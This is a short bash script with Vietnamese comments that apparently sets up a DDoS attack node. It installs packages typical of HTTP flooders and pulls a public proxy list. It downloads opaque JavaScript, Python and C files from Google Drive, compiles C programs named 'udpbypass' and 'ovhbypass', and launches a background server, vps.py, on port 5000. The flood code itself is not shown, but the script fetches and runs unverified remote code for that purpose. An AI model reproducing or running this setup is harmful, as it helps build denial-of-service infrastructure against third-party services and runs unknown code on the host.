#!/bin/bash
echo "------------------------------------------"
echo "🛠️ 1. CÀI ĐẶT MÔI TRƯỜNG HỆ THỐNG"
sudo apt-get update -y
sudo apt-get install -y python3-pip wget gcc nodejs npm unzip
pip install gdown flask requests
npm install cluster colors colorama axios crypto discord.js gradient-string user-agents header-generator hpack socks puppeteer-real-browser

echo "📂 2. TẢI SOURCE CODE (.PY, .JS, .C)"
wget https://github.com/ErcinDedeoglu/proxies/raw/refs/heads/main/proxies/https.txt -O proxy.txt
gdown 1l7XemuQ4MuxYYzmzLYnXTF9tXw_mutgV -O hieu.js
gdown 1Kpe6qSbsNaS-z0f9BMCyJsi3ooVouPLh -O raw.js
gdown 1d7DjHHAqvOA5QkYw196JJZ_Vj3xMXfZF
gdown https://drive.google.com/uc?id=1yUo671F3nwX1KGRYxzZl09F15eMtNaZV
gdown 1W-q3LSgM6oE14Fd_rrWVwRUmqxgChdMZ
gdown 1z0VINnYv93dXpwfsN524oIDugy1gaX8A
gdown 1_wXltanrFfLzl0hembWZ1f6PwFy4qbZW
gdown 1YKNPGX9B3u9p-NaV33BgVJ0W9lkrRgQx
gdown 1Vq9T9WkLJdMDQf9s2mL4w32cRsxr6lPk
gdown 1ICGS7OQEsc4nbMWEVNU7OM9manNl-OAU

echo "🔨 3. BIÊN DỊCH MÃ NGUỒN C"
gdown 1MuaBraso20I73ixepu6SQWDq0GMnlU05 -O udpbypass.c
gdown 1Q2VYSvBdeclp6A1f8xePFrT6Yt7ZB2gX -O ovh.c
gcc udpbypass.c -o udpbypass
gcc ovh.c -o ovhbypass
chmod +x udpbypass ovhbypass

echo "🐍 4. KHỞI CHẠY VPS SERVER"
gdown 1Nr_mkvx54ih7esfpFd8QheaVvGL8O2J6 -O vps.py
if [ -f "vps.py" ]; then
    nohup python3 vps.py > vps.log 2>&1 &
    echo "✅ Server vps.py đang chạy tại PORT 5000"
else
    echo "❌ LỖI: Không tải được vps.py"
fi
echo "------------------------------------------"